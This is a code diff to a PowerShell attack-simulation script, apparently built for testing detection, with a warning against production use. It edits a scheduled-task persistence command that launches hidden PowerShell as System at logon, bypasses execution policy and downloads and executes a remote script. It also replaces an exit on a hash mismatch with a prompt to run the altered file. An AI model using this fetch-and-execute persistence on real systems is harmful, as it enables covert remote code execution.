@@ -103,7 +103,14 @@ Function Write-DownloadMessage([string]$ToolName, [string]$Url,$originalHash){
         else
         {
             Write-ErrToConsole "WARNING !!! File hash mismtach [$sha1] - The downloaded file [$FileName] was changed and it's NOT recommended to run it"
-            Exit
+            Write-Host "[*] [$strDate]`t Would you like to run this file?"  -ForegroundColor Yellow
+            $Readhost = Read-Host " ( yes / no ) " 
+            Switch ($ReadHost) 
+            { 
+               Yes {[string]$FileName} 
+               No {$null} 
+               Default {$null} 
+            }             
         }
 
      }
@@ -150,7 +157,7 @@ Function Init() {
     Write-Host "`tAuthor  :: Moti Bani" -ForegroundColor Magenta
     Write-Host "`tTwitter :: @Moti_Ba" -ForegroundColor Magenta
     Write-Host "`tBlog    :: http://blogs.technet.com/motiba" -ForegroundColor Magenta
-    Write-Host "`tVersion :: 1.0" -ForegroundColor Magenta
+    Write-Host "`tVersion :: 1.1" -ForegroundColor Magenta
     Write-Host ""
     Write-Host "`tWarning :: Don't run this tool on production systems!" -ForegroundColor Magenta
     Write-Host ""
@@ -532,7 +539,7 @@ Function sub_Persistence_NewService([switch]$Unquoted) {
     #(get-wmiobject win32_service -filter "name='WindowsHealth'").delete()
 }
 Function sub_Persistence_ScheduledTasks() {
-    Start-ProcessEx -FileName "schtasks.exe" -Arguments '/create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6''''))'" /sc onlogon /ru System'"
+    Start-ProcessEx -FileName "schtasks.exe" -Arguments '/create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6''''))'" /sc onlogon /ru System'"
 }
 Function sub_Persistence_RegistryRunKeysHKLM() {
     Set-RegistryKey -RegKey "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" `
